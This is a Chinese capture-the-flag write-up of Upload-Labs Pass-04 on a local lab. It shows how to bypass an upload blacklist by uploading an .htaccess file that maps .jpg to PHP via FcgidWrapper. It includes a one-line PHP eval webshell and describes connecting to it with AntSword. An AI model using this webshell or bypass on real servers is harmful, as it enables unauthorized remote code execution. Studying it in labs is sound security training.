【Upload-Labs】Pass-04 .htaccess 文件上传绕过 Writeup

操作者：何芊宏 | 操作日期：2026.11.02 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, .htaccess, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-04 (服务端黑名单校验 - 漏网之鱼)
  • 提示：任务为上传一个 webshell 到服务器。黑名单包含了大量的脚本后缀，但未拦截特定配置文件。

2. 核心原理与前置分析

本关卡的核心漏洞在于黑名单机制遗漏了服务器配置文件。

分析源码可知，$deny_ext 数组中包含了 .php、.php5、.phtml 等几乎所有常见的脚本后缀，常规的后缀绕过在此失效。然而，黑名单中并没有包含 .htaccess。

.htaccess 是 Apache Web 服务器的分布式配置文件。如果允许上传该文件，攻击者就可以在文件中自定义目录级别的解析规则，例如强制将所有 .jpg 文件交由 PHP 引擎解析。

环境差异注意：本机环境为 mod_fcgid 模式，并非传统的 mod_php。因此，网上的老教程 AddType application/x-httpd-php .jpg 在此不生效。必须使用 AddHandler 配合 FcgidWrapper 指定 php-cgi.exe 的绝对路径才能成功触发解析。

3. 工具配置与操作步骤

工具配置：中国蚁剑

  • 中国蚁剑：URL 地址：http://127.0.0.1:8081/upload/shell.jpg；连接密码：cmd；编码：UTF-8。

操作步骤与解析：

第一步：制作 .htaccess 规则文件

新建一个文本文件，命名为 .htaccess（无后缀名），写入以下指令（根据本地实际路径配置）：

AddHandler fcgid-script .jpg
FcgidWrapper "D:/phpstudy_pro/Extensions/php/php5.4.45nts/php-cgi.exe" .jpg

该配置的作用是：将 .jpg 后缀的文件映射给 FastCGI 进程，并使用指定的 PHP CGI 程序进行解析。

第二步：上传规则与 Payload

1. 在 Pass-04 页面直接上传 .htaccess 文件（因其不在黑名单内，直接通过）。

2. 准备一个 shell.jpg 文件，内容为 <?php @eval($_POST['cmd']); ?>，并将其上传。

第三步：验证与连接

在浏览器中访问 http://127.0.0.1:8081/upload/shell.jpg。页面返回纯白空白，证明 .htaccess 已生效，图片后缀被成功当作 PHP 脚本解析。

使用蚁剑连接该 .jpg 路径，成功获取服务器权限。

第四步：清理现场（关键）

利用蚁剑连接到 upload 目录，右键删除刚才上传的 .htaccess 文件。因为该文件会“污染”整个目录的解析规则，如果不删除，后续关卡上传的任何 .jpg 都会被当成 PHP 执行，导致后续关卡结果失真。

4. 踩坑记录与复盘

  • 解析指令的差异：在 FastCGI 环境下，Apache 不再内置 PHP 解析器，必须通过 FcgidWrapper 显式指定外部 php-cgi.exe 的路径。如果盲目照搬老旧的 AddType 指令，会导致文件上传成功但无法解析，变成普通图片。
  • 黑盒思维盲区：在实战中，往往容易只盯着脚本后缀（如 .php、.jsp）找绕过，而忽略了服务器本身支持的其他特殊配置文件（如 Apache 的 .htaccess，或 Nginx 的配置）。

5. 知识点总结

  • .htaccess 劫持：利用 Apache 的目录级配置文件特性，通过上传恶意规则，改变目标目录内文件解析的映射关系（例如将图片后缀解析为脚本）。
  • FcgidWrapper 指令：用于在 FastCGI 模式下，将特定后缀的文件绑定到外部的解释器程序（如 php-cgi.exe）。
